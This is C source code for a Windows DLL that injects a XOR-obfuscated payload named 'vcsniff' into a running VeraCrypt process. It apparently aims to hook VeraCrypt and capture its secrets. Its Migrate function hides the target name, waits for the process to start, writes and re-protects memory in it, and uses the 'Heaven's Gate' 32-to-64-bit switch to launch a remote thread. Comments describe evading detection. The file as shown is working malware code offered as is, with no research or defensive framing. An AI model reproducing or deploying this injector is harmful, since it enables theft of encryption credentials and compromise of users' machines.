#include <Windows.h>

#include "execute64.bin.inc"
#include "wownative.bin.inc"

#include "../vcsniff/vcsniff.bin.inc"

#define UTILS_IMPLEMENTATION
#include "../utils.h"

typedef struct _WOW64CONTEXT
{
    union
    {
        HANDLE hProcess;
        BYTE bPadding2[8];
    } h;

    union
    {
        LPVOID lpvStartAddress;
        BYTE bPadding1[8];
    } s;

    union
    {
        LPVOID lpParameter;
        BYTE bPadding2[8];
    } p;

    union
    {
        HANDLE hThread;
        BYTE hPadding2[8];
    } t;
} WOW64CONTEXT, *LPWOW64CONTEXT;

// Function to go to jump to 64 bit mode from 32 bit mode through "Heaven's Gate", 
// before attempting to create a thread in the target process
typedef BOOL(WINAPI *X64FUNCTION)(DWORD dwParameter);

// Function to create a new thread in the target process and provide the threadID
typedef DWORD(WINAPI *EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);

__declspec(dllexport) void Migrate()
{
    EXECUTEX64 Execute64 = NULL;
    X64FUNCTION X64Function = NULL;

    LPVOID lpvPayloadMem = NULL;

    // Get kernel module handle from the PEB
    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        goto shutdown;
    }

    // Populate frequently used function pointers from the kernel dll
    PopulateKernelFunctionPtrsByName(hKernel);

    // Use xored hex values to prevent clear text being embedded in the binary
    char cVeraCrypt[] = {0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0};
    MyXor(cVeraCrypt, 13, key, key_len);

    // Find the process id of VeraCrypt so we can allocate memory and inject the hooking payload into its memory
    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = FindTargetProcessID(cVeraCrypt);

        if (dwProcID != -1)
            break;

        pSleep(5000);
    }

    // OpenProcess will all permissions. Permissions can be fine tuned for specific operations to avoid raising suspicions
    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hProc == NULL)
    {
        goto shutdown;
    }

    // Allocate memory in the target process
    lpvPayloadMem = pVirtualAllocEx(hProc, NULL, vcsniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lpvPayloadMem == NULL)
    {
        goto shutdown;
    }

    // Un Xor the payload before writing it to the memory allocated in the target process
    MyXor(vcsniff_data, vcsniff_data_len, key, key_len);

    // Write the hooking payload to the memory
    if (!pWriteProcessMemory(hProc, lpvPayloadMem, vcsniff_data, vcsniff_data_len, NULL))
    {
        goto shutdown;
    }

    // Change the permission of the memory to execute read
    DWORD dwOldProtect = 0;
    if (!pVirtualProtectEx(hProc, lpvPayloadMem, vcsniff_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }

    // Allocate memory in the current process for the execute64 function
    Execute64 = (EXECUTEX64)pVirtualAlloc(NULL, execute64_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (Execute64 == NULL)
    {
        goto shutdown;
    }

    // Un Xor the function body
    MyXor(execute64_data, execute64_data_len, key, key_len);

    // copy the function code from the buffer to the process memory
    MyMemCpy(Execute64, execute64_data, execute64_data_len);

    // Change protection to execute read
    if (!pVirtualProtect(Execute64, execute64_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }

    // Allocate memory space for x64function
    X64Function = (X64FUNCTION)pVirtualAlloc(NULL, wownative_data_len + sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (X64Function == NULL)
    {
        goto shutdown;
    }

    // Un Xor the function body
    MyXor(wownative_data, wownative_data_len, key, key_len);

    // copy the function code from the buffer to the process memory
    MyMemCpy(X64Function, wownative_data, wownative_data_len);

    // Change protection to execute read write since the function writes the thread ID to its memory (threadID)
    if (!pVirtualProtect(X64Function, wownative_data_len + sizeof(WOW64CONTEXT), PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
        goto shutdown;
    }

    // Setup the context
    WOW64CONTEXT *ctx = (WOW64CONTEXT *)((ULONG_PTR)X64Function + wownative_data_len);
    ctx->h.hProcess = hProc;
    ctx->s.lpvStartAddress = lpvPayloadMem;
    ctx->p.lpParameter = 0;
    ctx->t.hThread = NULL;      // Will be populated by the calling function (execute64)

    // Make the jump from 32 bit to 64 bit
    Execute64(X64Function, (DWORD)ctx);

    // If the thread is successfully created in the target process, it is created in the suspend state so "resume" it
    if (ctx->t.hThread)
    {
        pResumeThread(ctx->t.hThread);
    }

shutdown:
    return;
}

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;

    default:
        break;
    }

    return TRUE;
}
